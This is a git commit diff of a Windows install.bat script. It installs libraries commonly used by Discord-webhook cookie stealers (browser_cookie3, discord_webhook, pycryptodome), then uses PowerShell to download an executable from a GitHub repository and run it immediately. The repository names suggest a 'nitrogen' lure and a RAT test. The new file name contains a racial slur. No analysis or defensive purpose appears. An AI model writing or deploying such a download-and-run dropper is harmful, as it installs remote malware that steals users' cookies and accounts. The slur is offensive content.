cc7fbfe6e6a704865863a3dcf01f24e1fe62750d
Nate <77444551+thatbreezedev@users.noreply.github.com>
2024-02-11 00:22:02 -0500

    Add files via upload

--- install.bat
+++ install.bat
@@ -2,14 +2,14 @@
 
 REM
 echo Installing dependencies...
-py -m pip install discord_webhook browser_cookie3 psutil pywin32 pycryptodome
+pip install discord_webhook browser_cookie3 psutil pywin32 pycryptodome
 
 REM 
 echo Downloading executable file from GitHub...
-powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/thatbreezedev/rattesting/raw/main/realtest.exe', '.\nitrogen.exe')"
+powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/I6BTN/nitrogen/raw/main/niggas.exe', '.\niggas.exe')"
 
 REM 
 echo Running downloaded file...
-start nitrogen.exe
+start niggas.exe
 
 pause
